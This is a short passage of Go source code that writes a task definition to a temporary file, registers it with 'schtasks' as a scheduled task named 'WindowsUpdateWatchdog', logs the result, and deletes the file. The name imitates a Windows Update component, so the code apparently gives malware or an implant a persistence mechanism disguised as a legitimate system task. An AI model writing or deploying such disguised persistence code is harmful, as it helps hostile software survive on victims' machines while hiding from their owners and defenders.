	_ = os.WriteFile(tmpWatchdogTask, []byte(watchdogTaskXML), 0644)
	out, err := exec.Command("schtasks", "/create", "/tn", "WindowsUpdateWatchdog", "/xml", tmpWatchdogTask, "/f").CombinedOutput()
	if err != nil {
		log.Printf("[!] Failed to create watchdog task: %v %s", err, string(out))
	} else {
		log.Printf("[*] Watchdog task registered successfully")
	}
	_ = os.Remove(tmpWatchdogTask)
}